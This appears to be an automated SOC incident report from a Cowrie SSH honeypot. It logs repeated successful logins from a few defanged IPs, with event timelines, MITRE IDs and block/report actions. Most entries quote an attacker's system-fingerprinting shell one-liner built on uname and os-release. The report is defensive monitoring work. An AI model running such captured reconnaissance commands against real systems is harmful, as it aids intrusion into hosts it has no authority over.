| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:31:18` | `cowrie.session.connect` |
| `2026-07-06 13:31:18` | `cowrie.client.version` |
| `2026-07-06 13:31:18` | `cowrie.client.kex` |
| `2026-07-06 13:31:20` | `cowrie.login.success` |
| `2026-07-06 13:31:21` | `cowrie.session.params` |
| `2026-07-06 13:31:21` | `cowrie.command.input` |
| `2026-07-06 13:31:21` | `cowrie.command.input` |
| `2026-07-06 13:31:21` | `cowrie.command.input` |
| `2026-07-06 13:31:21` | `cowrie.command.input` |
| `2026-07-06 13:31:21` | `cowrie.command.input` |
| `2026-07-06 13:31:21` | `cowrie.command.success` |
| `2026-07-06 13:31:21` | `cowrie.command.input` |
| `2026-07-06 13:31:21` | `cowrie.command.input` |
| `2026-07-06 13:31:21` | `cowrie.command.input` |
| `2026-07-06 13:31:21` | `cowrie.command.input` |
| `2026-07-06 13:31:22` | `cowrie.log.closed` |
| `2026-07-06 13:31:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63cc8afa5bd2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:32 |
| **Last Seen** | 2026-07-06 13:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:32:42` | `cowrie.session.connect` |
| `2026-07-06 13:32:42` | `cowrie.client.version` |
| `2026-07-06 13:32:42` | `cowrie.client.kex` |
| `2026-07-06 13:32:44` | `cowrie.login.success` |
| `2026-07-06 13:32:45` | `cowrie.session.params` |
| `2026-07-06 13:32:45` | `cowrie.command.input` |
| `2026-07-06 13:32:45` | `cowrie.command.input` |
| `2026-07-06 13:32:45` | `cowrie.command.input` |
| `2026-07-06 13:32:45` | `cowrie.command.input` |
| `2026-07-06 13:32:45` | `cowrie.command.input` |
| `2026-07-06 13:32:45` | `cowrie.command.success` |
| `2026-07-06 13:32:45` | `cowrie.command.input` |
| `2026-07-06 13:32:45` | `cowrie.command.input` |
| `2026-07-06 13:32:45` | `cowrie.command.input` |
| `2026-07-06 13:32:45` | `cowrie.command.input` |
| `2026-07-06 13:32:46` | `cowrie.log.closed` |
| `2026-07-06 13:32:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55a952702217

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:32 |
| **Last Seen** | 2026-07-06 13:33 |
| **Session Duration** | 42s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:32:51` | `cowrie.session.connect` |
| `2026-07-06 13:32:55` | `cowrie.client.version` |
| `2026-07-06 13:32:55` | `cowrie.client.kex` |
| `2026-07-06 13:33:14` | `cowrie.login.success` |
| `2026-07-06 13:33:24` | `cowrie.session.params` |
| `2026-07-06 13:33:24` | `cowrie.command.input` |
| `2026-07-06 13:33:24` | `cowrie.command.input` |
| `2026-07-06 13:33:24` | `cowrie.command.input` |
| `2026-07-06 13:33:24` | `cowrie.command.input` |
| `2026-07-06 13:33:24` | `cowrie.command.input` |
| `2026-07-06 13:33:24` | `cowrie.command.success` |
| `2026-07-06 13:33:24` | `cowrie.command.input` |
| `2026-07-06 13:33:24` | `cowrie.command.input` |
| `2026-07-06 13:33:24` | `cowrie.command.input` |
| `2026-07-06 13:33:24` | `cowrie.command.input` |
| `2026-07-06 13:33:28` | `cowrie.log.closed` |
| `2026-07-06 13:33:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6efd20ada69e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:34 |
| **Last Seen** | 2026-07-06 13:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:34:06` | `cowrie.session.connect` |
| `2026-07-06 13:34:06` | `cowrie.client.version` |
| `2026-07-06 13:34:06` | `cowrie.client.kex` |
| `2026-07-06 13:34:08` | `cowrie.login.success` |
| `2026-07-06 13:34:09` | `cowrie.session.params` |
| `2026-07-06 13:34:09` | `cowrie.command.input` |
| `2026-07-06 13:34:09` | `cowrie.command.input` |
| `2026-07-06 13:34:09` | `cowrie.command.input` |
| `2026-07-06 13:34:09` | `cowrie.command.input` |
| `2026-07-06 13:34:09` | `cowrie.command.input` |
| `2026-07-06 13:34:09` | `cowrie.command.success` |
| `2026-07-06 13:34:09` | `cowrie.command.input` |
| `2026-07-06 13:34:09` | `cowrie.command.input` |
| `2026-07-06 13:34:09` | `cowrie.command.input` |
| `2026-07-06 13:34:09` | `cowrie.command.input` |
| `2026-07-06 13:34:10` | `cowrie.log.closed` |
| `2026-07-06 13:34:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bca43f50833c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:35 |
| **Last Seen** | 2026-07-06 13:35 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:35:02` | `cowrie.session.connect` |
| `2026-07-06 13:35:05` | `cowrie.client.version` |
| `2026-07-06 13:35:05` | `cowrie.client.kex` |
| `2026-07-06 13:35:25` | `cowrie.login.success` |
| `2026-07-06 13:35:35` | `cowrie.session.params` |
| `2026-07-06 13:35:35` | `cowrie.command.input` |
| `2026-07-06 13:35:35` | `cowrie.command.input` |
| `2026-07-06 13:35:35` | `cowrie.command.input` |
| `2026-07-06 13:35:35` | `cowrie.command.input` |
| `2026-07-06 13:35:35` | `cowrie.command.input` |
| `2026-07-06 13:35:35` | `cowrie.command.success` |
| `2026-07-06 13:35:35` | `cowrie.command.input` |
| `2026-07-06 13:35:35` | `cowrie.command.input` |
| `2026-07-06 13:35:35` | `cowrie.command.input` |
| `2026-07-06 13:35:35` | `cowrie.command.input` |
| `2026-07-06 13:35:39` | `cowrie.log.closed` |
| `2026-07-06 13:35:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecf9272d7360

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:35 |
| **Last Seen** | 2026-07-06 13:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:35:30` | `cowrie.session.connect` |
| `2026-07-06 13:35:31` | `cowrie.client.version` |
| `2026-07-06 13:35:31` | `cowrie.client.kex` |
| `2026-07-06 13:35:32` | `cowrie.login.success` |
| `2026-07-06 13:35:33` | `cowrie.session.params` |
| `2026-07-06 13:35:33` | `cowrie.command.input` |
| `2026-07-06 13:35:33` | `cowrie.command.input` |
| `2026-07-06 13:35:33` | `cowrie.command.input` |
| `2026-07-06 13:35:33` | `cowrie.command.input` |
| `2026-07-06 13:35:33` | `cowrie.command.input` |
| `2026-07-06 13:35:33` | `cowrie.command.success` |
| `2026-07-06 13:35:33` | `cowrie.command.input` |
| `2026-07-06 13:35:33` | `cowrie.command.input` |
| `2026-07-06 13:35:33` | `cowrie.command.input` |
| `2026-07-06 13:35:33` | `cowrie.command.input` |
| `2026-07-06 13:35:34` | `cowrie.log.closed` |
| `2026-07-06 13:35:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fa0f4dc350e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 13:35 |
| **Last Seen** | 2026-07-06 13:36 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:35:54` | `cowrie.session.connect` |
| `2026-07-06 13:35:55` | `cowrie.client.version` |
| `2026-07-06 13:35:55` | `cowrie.client.kex` |
| `2026-07-06 13:36:01` | `cowrie.login.success` |
| `2026-07-06 13:36:05` | `cowrie.session.params` |
| `2026-07-06 13:36:05` | `cowrie.command.input` |
| `2026-07-06 13:36:06` | `cowrie.log.closed` |
| `2026-07-06 13:36:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4fec8688f4d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:36 |
| **Last Seen** | 2026-07-06 13:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:36:53` | `cowrie.session.connect` |
| `2026-07-06 13:36:53` | `cowrie.client.version` |
| `2026-07-06 13:36:53` | `cowrie.client.kex` |
| `2026-07-06 13:36:55` | `cowrie.login.success` |
| `2026-07-06 13:36:56` | `cowrie.session.params` |
| `2026-07-06 13:36:56` | `cowrie.command.input` |
| `2026-07-06 13:36:56` | `cowrie.command.input` |
| `2026-07-06 13:36:56` | `cowrie.command.input` |
| `2026-07-06 13:36:56` | `cowrie.command.input` |
| `2026-07-06 13:36:56` | `cowrie.command.input` |
| `2026-07-06 13:36:56` | `cowrie.command.success` |
| `2026-07-06 13:36:56` | `cowrie.command.input` |
| `2026-07-06 13:36:56` | `cowrie.command.input` |
| `2026-07-06 13:36:56` | `cowrie.command.input` |
| `2026-07-06 13:36:56` | `cowrie.command.input` |
| `2026-07-06 13:36:57` | `cowrie.log.closed` |
| `2026-07-06 13:36:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ec0e306dfae

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:37 |
| **Last Seen** | 2026-07-06 13:37 |
| **Session Duration** | 40s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:37:06` | `cowrie.session.connect` |
| `2026-07-06 13:37:10` | `cowrie.client.version` |
| `2026-07-06 13:37:10` | `cowrie.client.kex` |
| `2026-07-06 13:37:28` | `cowrie.login.success` |
| `2026-07-06 13:37:37` | `cowrie.session.params` |
| `2026-07-06 13:37:37` | `cowrie.command.input` |
| `2026-07-06 13:37:37` | `cowrie.command.input` |
| `2026-07-06 13:37:37` | `cowrie.command.input` |
| `2026-07-06 13:37:37` | `cowrie.command.input` |
| `2026-07-06 13:37:37` | `cowrie.command.input` |
| `2026-07-06 13:37:37` | `cowrie.command.success` |
| `2026-07-06 13:37:37` | `cowrie.command.input` |
| `2026-07-06 13:37:37` | `cowrie.command.input` |
| `2026-07-06 13:37:37` | `cowrie.command.input` |
| `2026-07-06 13:37:37` | `cowrie.command.input` |
| `2026-07-06 13:37:42` | `cowrie.log.closed` |
| `2026-07-06 13:37:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04ba9603b276

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:38 |
| **Last Seen** | 2026-07-06 13:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:38:15` | `cowrie.session.connect` |
| `2026-07-06 13:38:16` | `cowrie.client.version` |
| `2026-07-06 13:38:16` | `cowrie.client.kex` |
| `2026-07-06 13:38:17` | `cowrie.login.success` |
| `2026-07-06 13:38:19` | `cowrie.session.params` |
| `2026-07-06 13:38:19` | `cowrie.command.input` |
| `2026-07-06 13:38:19` | `cowrie.command.input` |
| `2026-07-06 13:38:19` | `cowrie.command.input` |
| `2026-07-06 13:38:19` | `cowrie.command.input` |
| `2026-07-06 13:38:19` | `cowrie.command.input` |
| `2026-07-06 13:38:19` | `cowrie.command.success` |
| `2026-07-06 13:38:19` | `cowrie.command.input` |
| `2026-07-06 13:38:19` | `cowrie.command.input` |
| `2026-07-06 13:38:19` | `cowrie.command.input` |
| `2026-07-06 13:38:19` | `cowrie.command.input` |
| `2026-07-06 13:38:19` | `cowrie.log.closed` |
| `2026-07-06 13:38:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adab9209aab6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:39 |
| **Last Seen** | 2026-07-06 13:39 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:39:08` | `cowrie.session.connect` |
| `2026-07-06 13:39:12` | `cowrie.client.version` |
| `2026-07-06 13:39:12` | `cowrie.client.kex` |
| `2026-07-06 13:39:28` | `cowrie.login.success` |
| `2026-07-06 13:39:38` | `cowrie.session.params` |
| `2026-07-06 13:39:38` | `cowrie.command.input` |
| `2026-07-06 13:39:38` | `cowrie.command.input` |
| `2026-07-06 13:39:38` | `cowrie.command.input` |
| `2026-07-06 13:39:38` | `cowrie.command.input` |
| `2026-07-06 13:39:38` | `cowrie.command.input` |
| `2026-07-06 13:39:38` | `cowrie.command.success` |
| `2026-07-06 13:39:38` | `cowrie.command.input` |
| `2026-07-06 13:39:38` | `cowrie.command.input` |
| `2026-07-06 13:39:38` | `cowrie.command.input` |
| `2026-07-06 13:39:38` | `cowrie.command.input` |
| `2026-07-06 13:39:42` | `cowrie.log.closed` |
| `2026-07-06 13:39:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57d10a229521

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:39 |
| **Last Seen** | 2026-07-06 13:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:39:38` | `cowrie.session.connect` |
| `2026-07-06 13:39:38` | `cowrie.client.version` |
| `2026-07-06 13:39:38` | `cowrie.client.kex` |
| `2026-07-06 13:39:39` | `cowrie.login.success` |
| `2026-07-06 13:39:41` | `cowrie.session.params` |
| `2026-07-06 13:39:41` | `cowrie.command.input` |
| `2026-07-06 13:39:41` | `cowrie.command.input` |
| `2026-07-06 13:39:41` | `cowrie.command.input` |
| `2026-07-06 13:39:41` | `cowrie.command.input` |
| `2026-07-06 13:39:41` | `cowrie.command.input` |
| `2026-07-06 13:39:41` | `cowrie.command.success` |
| `2026-07-06 13:39:41` | `cowrie.command.input` |
| `2026-07-06 13:39:41` | `cowrie.command.input` |
| `2026-07-06 13:39:41` | `cowrie.command.input` |
| `2026-07-06 13:39:41` | `cowrie.command.input` |
| `2026-07-06 13:39:41` | `cowrie.log.closed` |
| `2026-07-06 13:39:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0757b729e8c

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-06 13:40 |
| **Last Seen** | 2026-07-06 13:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:40:34` | `cowrie.session.connect` |
| `2026-07-06 13:40:34` | `cowrie.client.version` |
| `2026-07-06 13:40:34` | `cowrie.client.kex` |
| `2026-07-06 13:40:34` | `cowrie.login.success` |
| `2026-07-06 13:40:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db0c2d1967e5

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-06 13:40 |
| **Last Seen** | 2026-07-06 13:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:40:35` | `cowrie.session.connect` |
| `2026-07-06 13:40:35` | `cowrie.client.version` |
| `2026-07-06 13:40:35` | `cowrie.client.kex` |
| `2026-07-06 13:40:35` | `cowrie.login.success` |
| `2026-07-06 13:40:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

